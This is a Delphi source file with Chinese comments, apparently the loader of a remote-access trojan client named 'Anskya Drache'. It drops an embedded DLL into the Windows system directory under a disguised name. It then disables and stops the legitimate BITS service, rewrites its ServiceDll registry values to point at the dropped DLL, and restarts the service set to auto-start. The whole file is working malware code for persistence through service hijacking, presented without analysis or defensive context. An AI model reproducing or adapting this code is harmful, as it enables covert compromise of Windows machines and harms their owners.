program ClinetLoader;

uses
  Windows, WinSvc, FunUnit, Unit_Clinet001;

const
  MasterMutex = 'Anskya_Drache_Client_001'; //  互斥体
  MasterServiceName = 'BITS';               //  服务名称

//  保存DLL
function Clinet001SaveFile(SaveFile: String): Boolean;
var
  hFile:THandle;
  BytesWrite: dword;
begin
  Result:=False;
  hFile := CreateFile(Pchar(SaveFile),GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ,nil,CREATE_ALWAYS,0,0);
  if hFile = INVALID_HANDLE_VALUE then Exit;
  if WriteFile(hFile,Clinet001Buf,Clinet001Size, BytesWrite, nil) then Result:=True;
  CloseHandle(hFile);
end;

var
  szBuffer: Array[0..MAX_PATH - 1] of char;
  StrDLLPath: String;
begin
  if Not CreatedMutexEx(MasterMutex) then ExitProcess(0);
  
  //  释放DLL
  ZeroMemory(@szBuffer, MAX_PATH);
  szBuffer[GetSystemDirectory(szBuffer, MAX_PATH)] := #00;
  StrDLLPath := String(szBuffer);
  StrDLLPath := StrDLLPath + '\' + 'SysAdsnwt.dll';

  if Clinet001SaveFile(StrDLLPath) then
  begin
    OutputDebugString('Free DLL Done!');
    //  设置服务为禁用模式
    ConfigServiceEx(MasterServiceName, SERVICE_DISABLED);
    //  停止已有的服务
    StartServiceEx(nil, MasterServiceName, False);

    //  修改注册表
    OutputDebugString('替换服务BITS');
    SetStrToReg(HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\BITS\Parameters', 'ServiceDll', Pchar(StrDLLPath));
    SetStrToReg(HKEY_LOCAL_MACHINE, 'SYSTEM\ControlSet003\Services\BITS\Parameters', 'ServiceDll', Pchar(StrDLLPath));

    OutputDebugString(Pchar('Start DLL Service:' + StrDLLPath));
    //  设置服务为开机自启动模式
    ConfigServiceEx(MasterServiceName, SERVICE_AUTO_START);
    //  重新开启服务
    StartServiceEx(nil, MasterServiceName, True);
  end;
  ExitProcess(0);
end.
